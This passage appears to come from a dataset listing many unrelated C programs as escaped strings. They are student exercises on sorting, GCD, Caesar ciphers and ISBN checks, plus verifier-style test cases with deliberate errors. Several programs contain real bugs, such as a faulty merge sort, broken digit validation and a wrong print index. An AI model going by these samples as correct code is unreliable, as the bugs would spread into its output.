    "#include <stdio.h>\n#include <unistd.h>\nint main(int argc, char **argv) {\n  pid_t forked_id = fork();\n  if (!forked_id)\n    printf(\"Parent PID: %d\\nChild PID: %d\\n\\n\", getppid(), getpid());\n  return 0;\n}",
    "#include <stdio.h>\n int gcdExtended(int a, int b, int *x, int *y){\n        if (a == 0){\n            *x = 0;\n            *y = 1;\n            return b;\n        }\n        int x1, y1;\n        int gcd = gcdExtended(b%a, a, &x1, &y1);\n        *x = y1 - (b/a) * x1;\n        *y = x1;\n        return gcd;\n    }\n    int gcd(int a, int b)\n    {\n        if (a == 0)\n            return b;\n        return gcd(b%a, a);\n    }\n    int main(){\n         int x, y;\n        int c = 35, d = 15;\n        int g = gcdExtended(c, d, &x, &y);\n        printf(\"gcd(%d, %d) = %d\\n\", c, d, g);\n        int a = 10, b = 15;\n        printf(\"GCD(%d, %d) = %d\\n\", a, b, gcd(a, b));\n        a = 35, b = 10;\n        printf(\"GCD(%d, %d) = %d\\n\", a, b, gcd(a, b));\n        a = 31, b = 2;\n        printf(\"GCD(%d, %d) = %d\\n\", a, b, gcd(a, b));\n        return 0;\n    }",
    "#include <stdio.h>\n#include<math.h>\nint main(){\n    float numero, quadrado, cubo, raiz2, raiz3;\n    printf(\"Digite o numero:\\n\");\n    scanf(\"%f%*c\",&numero);\n    quadrado=(numero*numero);\n    cubo=(numero*numero*numero);\n    raiz2=sqrt(numero);\n    raiz3=cbrt(numero);\n    printf(\"numero ao quadrado:%2.f\\n\",quadrado);\n    printf(\"numero ao cubo:%2.f\\n\",cubo);\n    printf(\"raiz quadrada do numero:%2.f\\n\",raiz2);\n    printf(\"raiz cubica do numero:%2.f/n\",raiz3);\n    return 0;\n}",
    "#include<stdio.h>\nint min_coins(int coins[], int s, int n)\n{\n if (n == 0)\n {\n  return 0;\n }\n int min = 1000000;\n for (int i = 0; i < s; i++)\n {\n  if (coins[i] <= n)\n  {\n   int ans = min_coins(coins, s, n-coins[i]);\n   if (ans != 1000000 && ans + 1 < min)\n   min = ans + 1;\n  }\n }\n return min;\n}\nint main(void)\n{\n int n,s;\n scanf(\"%d %d\",&n,&s);\n int coins[s];\n for (int i = 0; i < s; i++)\n {\n  scanf(\"%d\",&coins[i]);\n }\n int res = min_coins(coins, s, n);\n printf(\"%d\",res);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    FILE *file;\n    file = fopen(\"Myself.txt\",\"w\");\n    if(file==((void*)0)){\n        printf(\"File doesn't exist\\n\");\n    }\n    else{\n        printf(\"File is opened\\n\");\n        fclose(file);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nvoid reverse(char str[]);\nint getthisline(char str[], int);\nint main()\n{\n    int len;\n    char line[1000];\n    while((len = getthisline(line, 1000)) > 0) {\n        reverse(line);\n        printf(\"%s\\n\", line);\n    }\n}\nvoid reverse(char s[])\n{\n    int i, j;\n    char temp;\n    for (i = 0; s[i] != '\\0'; ++i);\n    for (j = i - 1, i = 0; j > i; --j, ++i) {\n        temp = s[i];\n        s[i] = s[j];\n        s[j] = temp;\n    }\n    s[j + i + 1] = '\\0';\n}\nint getthisline(char s[], int lim)\n{\n    int c, i;\n    for (i = 0; i < lim - 1 && (c = getchar()) != (-1) && c != '\\n'; ++i)\n        s[i] = c;\n    if (c == '\\n') {\n        s[i] = c;\n        ++i;\n    }\n    s[i] = '\\0';\n    return i;\n}",
    "#include <stdio.h>\nint main() {\n int p = 5;\n int *ptr1 = &p;\n int **ptr2 = &ptr1;\n int ***ptr3 = &ptr2;\n printf(\"value of *ptr1 %d\\n\", *ptr1);\n printf(\"value of **ptr2 %d\\n\", **ptr2);\n printf(\"value of ***ptr3 %d\\n\", ***ptr3);\n printf(\"address of ptr1 %p\\n\", (void*) &ptr1);\n printf(\"address of ptr2 %p\\n\", (void*) &ptr2);\n printf(\"address of ptr3 %p\\n\", (void*) &ptr3);\n printf(\"address of *ptr2 %p\\n\", (void*) ptr2);\n printf(\"address of *ptr3 %p\\n\", (void*) ptr3);\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <time.h>\nint main()\n{\n    FILE *file=fopen(\"nums.txt\",\"w\");\n    int i;\n    srand((unsigned)time(((void*)0)));\n    for (i = 0; i < 154761445; i++)\n        fprintf(file,\" %d\\n\", rand());\n}",
    "#include<stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdbool.h>\n#include <ctype.h>\nint checker(char* argv[]);\nchar *chyfunc(char *input, int key,unsigned int yah);\nint main(int argc , char *argv[]){\n  if(argc != 2){\n    printf(\"Usage: ./caesar [number]\\n\");\n    return 1;\n  }\n  int cyphnum = checker(argv);\n  if(!cyphnum){\n     printf(\"That is not a number,\\n\");\n     return 1;\n  }\n  char *userinput = malloc(sizeof(char)*500);\n  if(userinput == ((void*)0)){\n    printf(\"couldn't allocate mem\\n\");\n    return 1;\n  }\n  printf(\"Text: \");\n  fgets(userinput,500,(stdin));\n  unsigned int length = strlen(userinput);\n  printf(\"Cypher Text: %s\\n\",chyfunc(userinput,cyphnum,length));\n  free(userinput);\n  return 0;\n}\nint checker(char *argv[]){\n  return atoi(argv[1]);\n}\nchar get_char(int character,int key){\n    for(int j = 0;j<key;j++){\n      if(character == 90){\n        character = 65;\n      }\n      else if(character == 122){\n        character = 97;\n      }\n      else character++;\n     }\n     return character;\n  }\nchar *chyfunc(char *input,int key,unsigned int yah){\nfor (int i = 0; i < yah;i++){\n  if((0 ? isalpha(input[i]) : (((unsigned)(input[i])|32)-'a') < 26)){\n     input[i] = get_char(input[i],key);\n  }\n }\n return input;\n}",
    "#include <string.h>\n#include <stdio.h>\n#include <math.h>\n\n\nvoid power_set(char *set,int n){\n    unsigned int sub=pow(2,n);\n    int i,j;\n     for(i=0;i<sub;i++){\n      for(j=0;j<n;j++)\n    if(i&(1<<j))\n        printf(\"%c\",set[j]);\n   printf(\"\\n\");\n     }\n}\nint main(){\n char set[('d'-'a')+1];\n int cnst=97;\n int i,n=strlen(set)-1;\n  for(i=0;i<('d'-'a')+1;i++)\n   set[i]=cnst++;\n     printf(\"Set Given: \");\n     for(i=0;i<('d'-'a')+1;i++)\n      printf(\"%c, \",set[i]);\n     printf(\"\\n\");\n     power_set(set,('d'-'a')+1);\n    return 0;\n}",
    "#include <arpa/inet.h>\n#include <stdio.h>\nint main(int argc, char* argv[]) {\n  if (argc < 2) {\n    printf(\"Usage: %s <ip address>\\n\", argv[0]);\n    return -1;\n  }\n  in_addr_t ip;\n  int ret = inet_pton(1, argv[1], &ip);\n  if (((in_addr_t) 0xffffffff) == ret) {\n    printf(\"Failed to translate the ip string: %s\\n\", argv[1]);\n    return -1;\n  }\n  printf(\"integer ip address: %#x, return code: %d\\n\", ip, ret);\n  char str[16];\n  const char* ret_str = inet_ntop(1, &ip, str, 16);\n  printf(\"%p vs. %p\\n\", str, ret_str);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char const *argv[]) {\n  int *p;\n  p = (int*)calloc(8, sizeof(int));\n  if (p == ((void*)0)) {\n    printf(\"Memory didn't allocated.\\n\");\n  }\n  else {\n    printf(\"Memory allocated.\\n\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint main(void) {\n    int max = 0;\n    int num = 0;\n    int ch;\n    char output[1000];\n    while ((ch = getchar()) != (-1)) {\n        if (num >= 1000) {\n            printf(\"overflow!\\n\");\n            break;\n        }\n        output[num] = ch;\n        if (ch == '\\n') {\n            if (num > max) {\n                max = num;\n            }\n            num = 0;\n        } else {\n            num++;\n        }\n    }\n    printf(\"%s\", output);\n    printf(\"%d\", max - 1);\n    return 0;\n}",
    "#include <stdio.h>\ndouble mapRange(double a1,double a2,double b1,double b2,double s)\n{\n return b1 + (s-a1)*(b2-b1)/(a2-a1);\n}\nint main()\n{\n int i;\n puts(\"Mapping [0,10] to [-1,0] at intervals of 1:\");\n for(i=0;i<=10;i++)\n {\n  printf(\"f(%d) = %g\\n\",i,mapRange(0,10,-1,0,i));\n }\n return 0;\n}",
    "void f(void g(int)) {\n g(1);\n}\nvoid h(int i) {\n if(i==1) {\n  ERROR: goto ERROR;\n } else {\n }\n}\nvoid z(int i) {}\nint main(void) {\n void (*z)(int) = &h;\n f(z);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\nchar stack[101];\nint top = 0;\nvoid push(int i);\nchar pop();\nint main(void)\n{\n   char ch, operand1, operand2;\n   while(1) {\n      printf(\"Enter an RPN expression: \");\n      while ((ch = getchar()) != '\\n') {\n         if (ch >= '0' && ch <= '9')\n            push(ch - '0');\n         else\n            switch(ch) {\n               case '+' : push(pop() + pop());\n                           break;\n               case '-' : operand2 = pop(); operand1 = pop();\n                           push(operand1 - operand2);\n                           break;\n               case '*' : push(pop() * pop());\n                           break;\n               case '/' : operand2 = pop(); operand1 = pop();\n                           push(operand1 / operand2);\n                           break;\n               case '=' : printf(\"Value of expression: %d\\n\", pop());\n                           break;\n               case ' ' : break;\n               default : exit(1);\n            }\n      }\n   }\n   return 0;\n}\nvoid push(int i)\n{\n   if (top == 101) {\n      printf(\"\\nStack Overflow!\\n\");\n      exit(1);\n   } else\n      stack[top++] = i;\n}\nchar pop(void)\n{\n   if (top == 0) {\n      printf(\"\\nStack Underflow!\\n\");\n      exit(1);\n   } else\n      return stack[--top];\n}",
    "int main() {\n    int *pointer = 0;\n    int value = *pointer;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    size_t sum = 0;\n    size_t bythree, byfive;\n    for (bythree = 3, byfive = 5; bythree < 1000L; bythree += 3, byfive += 5) {\n        if (byfive % 3 && byfive < 1000L)\n            sum += byfive;\n        sum += bythree;\n    }\n    printf(\"Sum of all multiples of 3 and 5 below %ld: %zu\\n\", 1000L, sum);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(void){\n    char ar[] = \"I'm special\";\n    const char *pt = \"I'm special\";\n    printf(\"address of \\\"I'am special\\\": %p \\n\", \"I'm special\");\n    printf(\"\\t\\t address ar:%p\\n\", ar);\n    printf(\"\\t\\t address pt:%p\\n\", pt);\n    printf(\"\\t\\t address MSG:%p\\n\", \"I'm special\");\n    printf(\"addressof \\\"I'm special\\\": %p\\n\", \"I'm special\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\n\nint checkLength (char *);\nint checkFirstDigits (char *);\nint IsOnlyDigits (char *);\nint checkSum(char *);\nint conVertToInt32 (char);\nvoid CheckPublisher(char *);\nint main () {\n    char inputISBN[20];\n    scanf(\"%[^\\n]s\",inputISBN);\n    if (checkLength(inputISBN)\n        && checkFirstDigits(inputISBN)\n        && IsOnlyDigits(inputISBN)) {\n            if ((checkSum(inputISBN) + 48) == inputISBN[strlen(inputISBN) - 1]) {\n                printf(\"%d\",1);\n                CheckPublisher(inputISBN);\n                return 0;\n            }\n        }\n    printf(\"0\");\n    return 0;\n}\nint checkLength(char *isbn) {\n    int length = 0;\n    length = strlen(isbn);\n    if (length != 17) return -1;\n    return 1;\n}\nint checkFirstDigits(char *isbn) {\n    char start1[] = \"978\";\n    char start2[] = \"979\";\n    int first = strncmp(isbn, start1, 3);\n    int sec = strncmp(isbn, start2, 3);\n    if (first == 0 || sec == 0) {\n        return 1;\n    }\n    return -1;\n}\nint IsOnlyDigits(char *isbn) {\n    int index = 0;\n    for(; index < strlen(isbn); index++) {\n        if (isbn[index] < '0' || isbn[index] > '9' || isbn[index] != '-') {\n            break;\n            return -1;\n        }\n    }\n    return 1;\n}\nint checkSum (char *isbn) {\n    int counter = 0;\n    int position = counter + 1;\n    int sum = 0;\n    for (counter = 0; counter < strlen(isbn) - 1; counter++) {\n        if (isbn[counter] != '-') {\n            if (position % 2 == 0) {\n                sum = sum + conVertToInt32(isbn[counter])*3;\n            }\n            else sum = sum + conVertToInt32(isbn[counter])*1;\n            position = position + 1;\n        }\n    }\n    return 10 - (sum%10);\n}\nint conVertToInt32(char elem) {\n    return elem - 48;\n}\nvoid CheckPublisher(char *isbn) {\n    char BlueBridge[] = \"933346\";\n    char Alyson[] = \"55583\";\n    char FUNimation[] = \"4210\";\n    char Pyramid[] = \"01\";\n    if (strstr(isbn,BlueBridge) != ((void*)0)) {\n        printf(\"\\nBluebridge\");\n    }\n    if (strstr(isbn, Alyson) != ((void*)0)) {\n        printf(\"\\nAlyson Books\");\n    }\n    if (strstr(isbn, FUNimation) != ((void*)0)) {\n        printf(\"\\nFUNimation Productions, Ltd.\");\n    }\n    if (strstr(isbn, Pyramid) != ((void*)0)) {\n        printf(\"\\nPyramid Books\");\n    }\n}",
    "#include<stdio.h>\nint main(){\n    int wnum = 0;\n    char c;\n    printf(\"Input a string\\n\");\n    while((c = getchar()) != '\\n'){\n        if (c == ' ') {\n            wnum++;\n        }\n    }\n    printf(\"#words: %d\\n\", ++wnum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <err.h>\nextern char *__progname;\nstatic void usage(void)\n{\n if (strcmp(__progname, \"insert\") == 0)\n  fprintf((stderr), \"usage: %s offset bytes\\n\", __progname);\n else\n  fprintf((stderr), \"usage: %s bytes\\n\", __progname);\n exit(1);\n}\nint main(int argc, char *argv[])\n{\n int numbytes, offset = 0, c;\n if (strcmp(__progname, \"insert\") == 0)\n {\n  if (argc != 3) usage();\n  offset = atoi(argv[1]);\n  numbytes = atoi(argv[2]);\n }\n else\n {\n  if (argc != 2) usage();\n  numbytes = atoi(argv[1]);\n }\n if (numbytes < 0) errx(1, \"number of bytes must be nonnegative\");\n if (offset < 0) errx(1, \"offset must be nonnegative\");\n if (strcmp(__progname, \"append\") == 0)\n {\n  while ((c = getchar()) != (-1)) putchar(c);\n  while (numbytes-- > 0) putchar(0);\n }\n else if (strcmp(__progname, \"prepend\") == 0)\n {\n  while (numbytes-- > 0) putchar(0);\n  while ((c = getchar()) != (-1)) putchar(c);\n }\n else if (strcmp(__progname, \"insert\") == 0)\n {\n  while (offset-- > 0 && (c = getchar()) != (-1)) putchar(c);\n  while (numbytes-- > 0) putchar(0);\n  while ((c = getchar()) != (-1)) putchar(c);\n }\n else if (strcmp(__progname, \"pass\") == 0)\n  while (numbytes-- > 0 && (c = getchar()) != (-1)) putchar(c);\n else\n {\n  while (numbytes-- > 0 && getchar() != (-1)) ;\n  while ((c = getchar()) != (-1)) putchar(c);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint MAX(int *ar, int size)\n{\n    int i, max = ar[0];\n    for (i = 0; i < size; i++)\n    {\n        if (ar[i] > max)\n            max = ar[i];\n    }\n    return max;\n}\nvoid countSort(int *arr, int n, int place)\n{\n    int i, freq[10] = {0};\n    int *output = (int *)malloc(n * sizeof(int));\n    for (i = 0; i < n; i++) freq[(arr[i] / place) % 10]++;\n    for (i = 1; i < 10; i++) freq[i] += freq[i - 1];\n    for (i = n - 1; i >= 0; i--)\n    {\n        output[freq[(arr[i] / place) % 10] - 1] = arr[i];\n        freq[(arr[i] / place) % 10]--;\n    }\n    for (i = 0; i < n; i++) arr[i] = output[i];\n    free(output);\n}\nvoid radixsort2(int *arr, int n,\n                int max)\n{\n    int mul = 1;\n    while (max)\n    {\n        countSort(arr, n, mul);\n        mul *= 10;\n        max /= 10;\n    }\n}\nvoid display(int *arr, int N)\n{\n    for (int i = 0; i < N; i++) printf(\"%d, \", arr[i]);\n    putchar('\\n');\n}\nint main(int argc, const char *argv[])\n{\n    int n;\n    printf(\"Enter size of array:\\n\");\n    scanf(\"%d\", &n);\n    printf(\"Enter the elements of the array\\n\");\n    int i;\n    int *arr = (int *)malloc(n * sizeof(int));\n    for (i = 0; i < n; i++)\n    {\n        scanf(\"%d\", &arr[i]);\n    }\n    printf(\"Original array: \");\n    display(arr, n);\n    int max;\n    max = MAX(arr, n);\n    radixsort2(arr, n, max);\n    printf(\"Sorted array: \");\n    display(arr, n);\n    free(arr);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint x;\nvoid foo ()\n{\n  sleep(1);\n}\nint main(int argc,char **argv)\n{\n        x = atoi(argv[1]);\n while (1) { foo(); }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nvoid *safe_malloc(size_t size) {\n  void *ptr = malloc(size);\n  if (ptr == ((void*)0)) {\n    fprintf((stderr), \"Fatal: failed to allocate %lu bytes.\\n\", size);\n    exit(1);\n  }\n  return ptr;\n}\nvoid *safe_realloc(void *old_ptr, size_t size) {\n  void *new_ptr = realloc(old_ptr, size);\n  if (new_ptr == ((void*)0)) {\n    fprintf((stderr), \"Fatal: failed to reallocate to %lu bytes.\\n\", size);\n    exit(1);\n  }\n  return new_ptr;\n}\nvoid verify(void *region, int c, size_t len) {\n  char *r = region;\n  while (len--)\n    if (*(r++) != (char)c) {\n      fprintf((stderr), \"Memory failed to contain correct value!\\n\");\n      exit(1);\n    }\n}\nint overlap(void *r1, void *r2, size_t len) {\n  return ((size_t)r1 <= (size_t)r2 && (size_t)r2 < (size_t)(r1 + len)) ||\n         ((size_t)r1 >= (size_t)r2 && (size_t)r1 < (size_t)(r2 + len));\n}\nvoid verify_overlap3(void *r1, void *r2, void *r3, size_t len) {\n  if (overlap(r1, r2, len) || overlap(r1, r3, len) || overlap(r2, r3, len)) {\n    fprintf((stderr), \"Memory regions overlap!\\n\");\n    exit(1);\n  }\n}\nvoid *malloc_and_break(void *region, int c, size_t len) {\n  if (len < (1024)) {\n    return region;\n  }\n  void *sr1 = safe_realloc(region, len / 3);\n  void *sr2 = safe_malloc(len / 3);\n  void *sr3 = safe_malloc(len / 3);\n  verify_overlap3(sr1, sr2, sr3, len / 3);\n  verify(sr1, c, len / 3);\n  memset(sr1, 0xab, len / 3);\n  memset(sr2, 0xcd, len / 3);\n  memset(sr3, 0xef, len / 3);\n  free(sr1);\n  free(sr3);\n  sr2 = malloc_and_break(sr2, 0xcd, len / 3);\n  sr2 = safe_realloc(sr2, len);\n  verify(sr2, 0xcd, len / 3);\n  memset(sr2, c, len);\n  return sr2;\n}\nint main() {\n  size_t len = (1024 * 1024);\n  while (len > (1024)) {\n    void *mem = safe_malloc(len);\n    memset(mem, 0xff, len);\n    free(malloc_and_break(mem, 0xff, len));\n    len /= 3;\n  }\n  return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main (void)\n{\n  abort ();\n  printf (\"xyzzy\\n\");\n  exit (0);\n}",
    "const int x = 0;\nint* restrict y = 0;\nvolatile int z;\n_Atomic int w;\nint f();\nconst int g();\nvolatile int h();\n_Atomic int k();\nint main(void) {\n      return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int a,b;\n    printf(\"Enter the range: \");\n    scanf(\"%d %d\",&a,&b);\n    for(int i=a;i<=b;i++)\n        printf(\"%d ^ 3 = %d \\n\",i,i*i*i);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n  int i;\n  for(i=0; i<argc; i++) {\n    printf(\"argv[%d] = %s\\n\" ,i,argv[i]);\n  }\n  return 0;\n}",
    "int count = 0;\nint main()\n{\n    int *p_int;\n    p_int = &count;\n  while(*p_int < 21){\n    ++(*p_int);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <pthread.h>\n\n\n\n\n\nint main()\n{\n    printf(\"Constant named: #%s value: (UIntPointer array: %d). \\\"sizeof(%s) = %d\\\"\\n\", \"pthread_attr_t\", (int)(int)((sizeof(pthread_attr_t) + sizeof(void*) - 1) / sizeof(void*)), \"pthread_attr_t\", (int) sizeof(pthread_attr_t));;\n    printf(\"Constant named: #%s value: (UIntPointer array: %d). \\\"sizeof(%s) = %d\\\"\\n\", \"pthread_mutex_t\", (int)(int)((sizeof(pthread_mutex_t) + sizeof(void*) - 1) / sizeof(void*)), \"pthread_mutex_t\", (int) sizeof(pthread_mutex_t));;\n    printf(\"Constant named: #%s value: (UIntPointer array: %d). \\\"sizeof(%s) = %d\\\"\\n\", \"pthread_mutexattr_t\", (int)(int)((sizeof(pthread_mutexattr_t) + sizeof(void*) - 1) / sizeof(void*)), \"pthread_mutexattr_t\", (int) sizeof(pthread_mutexattr_t));;\n    printf(\"Constant named: #%s value: (UIntPointer array: %d). \\\"sizeof(%s) = %d\\\"\\n\", \"pthread_cond_t\", (int)(int)((sizeof(pthread_cond_t) + sizeof(void*) - 1) / sizeof(void*)), \"pthread_cond_t\", (int) sizeof(pthread_cond_t));;\n    printf(\"Constant named: #%s value: (UIntPointer array: %d). \\\"sizeof(%s) = %d\\\"\\n\", \"pthread_condattr_t\", (int)(int)((sizeof(pthread_condattr_t) + sizeof(void*) - 1) / sizeof(void*)), \"pthread_condattr_t\", (int) sizeof(pthread_condattr_t));;\n    printf(\"Constant named: #%s value: (UIntPointer array: %d). \\\"sizeof(%s) = %d\\\"\\n\", \"pthread_rwlock_t\", (int)(int)((sizeof(pthread_rwlock_t) + sizeof(void*) - 1) / sizeof(void*)), \"pthread_rwlock_t\", (int) sizeof(pthread_rwlock_t));;\n    printf(\"Constant named: #%s value: (UIntPointer array: %d). \\\"sizeof(%s) = %d\\\"\\n\", \"pthread_rwlockattr_t\", (int)(int)((sizeof(pthread_rwlockattr_t) + sizeof(void*) - 1) / sizeof(void*)), \"pthread_rwlockattr_t\", (int) sizeof(pthread_rwlockattr_t));;\n    printf(\"Constant named: #%s type: LibC CInt value: %d.\\n\", \"PTHREAD_MUTEX_NORMAL\", (int)0);;\n    printf(\"Constant named: #%s type: LibC CInt value: %d.\\n\", \"PTHREAD_MUTEX_ERRORCHECK\", (int)2);;\n    printf(\"Constant named: #%s type: LibC CInt value: %d.\\n\", \"PTHREAD_MUTEX_RECURSIVE\", (int)1);;\n    printf(\"Constant named: #%s type: LibC CInt value: %d.\\n\", \"PTHREAD_MUTEX_DEFAULT\", (int)0);;\n    return 0;\n}",
    "#include <stdio.h>\ndouble calc(double a);\nint main()\n{\n    double a;\n    printf(\"Please enter a double variable: \");\n    scanf(\"%lf\", &a);\n    printf(\"%.2f\\n\", calc(a));\n    return 0;\n}\ndouble calc(double a)\n{\n    return a * a * a;\n}",
    "#include<stdio.h>\nunsigned int sop(int x, int y, int z){\n int c1 = (!x)&(!y)&z;\n int c2 = (!x)&y&(!z);\n int c3 = x&(!y)&(!z);\n int c4 = x&y&z;\n int r =(c1|c2|c3|c4);\n return r;\n}\nunsigned int pos(int l, int m, int n){\n int s1 = l | m | n;\n int s2 = l | (!m) | (!n);\n int s3 = (!l) | m | (!n);\n int s4 = (!l) | (!m) | n;\n int r1 = (s1 & s2 & s3 & s4);\n return r1;\n}\nint main(){\n unsigned int a,b,c;\n printf(\"Enter three number either 0 or 1\\n\");\n scanf(\"%d%d%d\",&a,&b,&c);\n int result = sop(a,b,c);\n printf(\"result sop = %d\\n\",result);\n int result2 = pos(a,b,c);\n printf(\"result pos = %d\\n\",result2);\n return 0;\n}",
    "#include<stdio.h>\nint fact(int);\nint main()\n{\n  int n;\n  printf(\"Enter the factorial you wish to find : \");\n  scanf(\"%d\",&n);\n  int result = fact(n);\n  printf(\"\\n\\nThe factorial is : %d\",result);\n  return 0;\n}\nint fact(int a)\n{\n  if(a==0)\n    return 1;\n  else\n    return a*fact(a-1);\n}",
    "#include <stdio.h>\nint sum[200000],minus[200000],ans[200000],n,NoChoice=1,Max=-0xffff;\nint max(int* arr,int size){\n int max=0;\n while(size--) if(arr[size]>max)max=arr[size];\n if(arr[0]>max)max=arr[0];\n return max;\n}\nint main(){\n scanf(\"%d\",&n);\n scanf(\"%d\",sum);\n minus[0]=sum[0]<0?sum[0]:0;\n ans[0]=sum[0]-minus[0];\n int i;\n for(i=1;i<n;i++){\n  int j;\n  scanf(\"%d\",&j);\n  if(j>Max) Max=j;\n  sum[i]=sum[i-1]+j;\n  if(sum[i-1]+j<minus[i-1])minus[i]=sum[i-1]+j;\n  else minus[i]=minus[i-1];\n  if(sum[i]!=minus[i])NoChoice=0;\n  ans[i]=sum[i]-minus[i];\n }\n\n\n\n\n if(NoChoice)printf(\"%d\\n\",Max);\n else printf(\"%d\\n\",max(ans,n));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <math.h>\nvoid geraVetor(int *vet, int tamanho);\nvoid mergeSort(int *vetor, int inicio, int fim);\nvoid merge(int *vetor, int inicio, int meio, int fim);\nvoid imprimeVetor(int *vetor, int tamanho);\nint main(){\n    int opc;\n    int tam = 10;\n    int vetor[10];\n    do{\n        printf(\"1. Gerar e imprimir vetor.\\n\");\n        printf(\"0. Sair\\n\");\n        printf(\"Op\u00e7\u00e3o: 1 ou 0 pra sair.\\n\");\n        scanf(\"%d\", &opc);\n        setbuf((stdin), ((void*)0));\n        system(\"clear\");\n        switch (opc){\n        case 0:\n            printf(\"Voc\u00ea saiu do programa.\\n\");\n            break;\n        case 1:\n            printf(\"Gerando Vetor com %d elementos.\\n\", tam);\n            geraVetor(vetor, tam);\n            printf(\"Imprimindo Vetor Desordenado.\\n\");\n            imprimeVetor(vetor, tam);\n            printf(\"Ordenando Vetor com mergeSort\\n\");\n            mergeSort(vetor, 0, tam);\n            printf(\"Imprimindo Vetor Ordenado com mergeSort\\n\");\n            imprimeVetor(vetor, tam);\n            break;\n        default:\n            printf(\"Op\u00e7\u00e3o inv\u00e1lida!\\n\");\n            break;\n        }\n    } while (opc != 0);\n    return 0;\n}\nvoid geraVetor(int *vet, int tamanho){\n    srand(time(((void*)0)));\n    for(int i = 0; i < tamanho; i++){\n        vet[i] = rand()%1000;\n    }\n}\nvoid mergeSort(int *vetor, int inicio, int fim){\n    int meio;\n    if(inicio < fim){\n        meio = floor((inicio + fim)/2);\n        mergeSort(vetor, inicio, meio);\n        mergeSort(vetor, meio + 1, fim);\n        merge(vetor, inicio, meio, fim);\n    }\n}\nvoid merge(int *vetor, int inicio, int meio, int fim){\n    int geral, dir, esq, i;\n    int *temp;\n    temp = (int*) malloc(fim * sizeof(int));\n    esq = inicio;\n    dir = meio + 1;\n    if(temp != ((void*)0)){\n        for(i = 0; i < meio; i++){\n            if(vetor[esq] < vetor[dir]){\n                temp[i] = vetor[esq++];\n            }else{\n                temp[i] = vetor[dir++];\n            }\n        }\n    }\n    for(i = 0, geral = inicio; i < fim; i++, geral++){\n        vetor[geral] = temp[i];\n    }\n    free(temp);\n}\nvoid imprimeVetor(int *vetor, int tamanho){\n    for(int i = 0; i < tamanho; i++){\n        printf(\"%d, \", vetor[i]);\n    }printf(\"\\n\");\n}",
    "#include <stdio.h>\nvoid chline(char ch, int i, int j);\nint main(void)\n{\n    chline('c', 5, 10);\n    printf(\"\\n---------------------------------------------\\n\");\n    return 0;\n}\nvoid chline(char ch, int i, int j)\n{\n    int col;\n    for(col = 1; col <= j; col++) {\n        if (col < i)\n            putchar(' ');\n        else\n            putchar(ch);\n    }\n    putchar('\\n');\n}",
    "#include <stdio.h>\nint main()\n{\n int ertek;\n int *mutato=&ertek;\n printf(\"Kerem a szamot:\\n\");\n scanf(\"%d\", mutato);\n printf(\"A szam erteke: %d.\\n\", ertek);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int n,i;\n    scanf(\"%d\",&n);\n    double a,o=0;\n    for(i=0;i<n;i++)\n    {\n        scanf(\"%lf\",&a);\n        o=o+a;\n    }\n    o=(100.00*o)/(100.00*n);\n    printf(\"%.13lf\\n\",o);\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main()\n{\n printf(\"Hello World!\");\n char matrix[50][50];\n int inputs[50];\n int n, x , y, i;\n printf(\"Quantity\");\n scanf(\"%d\", &n);\n for (x = 0; x < n; x++)\n {\n  scanf(\"%d\", &inputs[x]);\n }\n i = inputs[0];\n for (x = 1; x < n; x++)\n {\n  if (i < inputs[x]) {\n   i = inputs[x];\n   inputs[x] = inputs[x - 1];\n   inputs[x - 1] = i;\n  }\n }\n for (x = 0; x < n; x++)\n {\n  printf(\"%d\", inputs[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\nint main(){\n  char buf[4096];\n  int c;\n  FILE * fd = fopen(\"safa\",\"w\");\n  int z = sprintf(buf,\"Merhaba ben safa\");\n  fputs(buf,fd);\n  fclose(fd);\n  FILE * tl = fopen(\"safa\",\"r\");\n  while((c = getc(tl)) != (-1)){\n    printf(\"%c\",c);\n  }\n  fclose(tl);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <semaphore.h>\n#include <pthread.h>\n#include <string.h>\n\nint counter[256];\nsem_t sem;\nvoid err_exit(char *msg)\n{\n perror(msg);\n exit(1);\n}\nvoid *analyze_even(void *arg)\n{\n char *str = (char *) arg;\n for (int i = 0; i < strlen(arg); i += 2) {\n  if (sem_wait(&sem))\n   err_exit(\"sem_wait() error\");\n  counter[(int) str[i]]++;\n  if (sem_post(&sem))\n   err_exit(\"sem_post() error\");\n }\n return ((void*)0);\n}\nvoid *analyze_odd(void *arg)\n{\n char *str = (char *) arg;\n for (int i = 1; i < strlen(arg); i += 2) {\n  if (sem_wait(&sem))\n   err_exit(\"sem_wait() error\");\n  counter[(int) str[i]]++;\n  if (sem_post(&sem))\n   err_exit(\"sem_post() error\");\n }\n return ((void*)0);\n}\nint main()\n{\n char *content = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. \"\n   \"Mattis rhoncus urna neque viverra justo nec ultrices. Pretium quam vulputate dignissim suspendisse in est ante. \"\n   \"Vitae congue mauris rhoncus aenean. Blandit cursus risus at ultrices mi. Ut lectus arcu bibendum at varius vel pharetra vel. \"\n   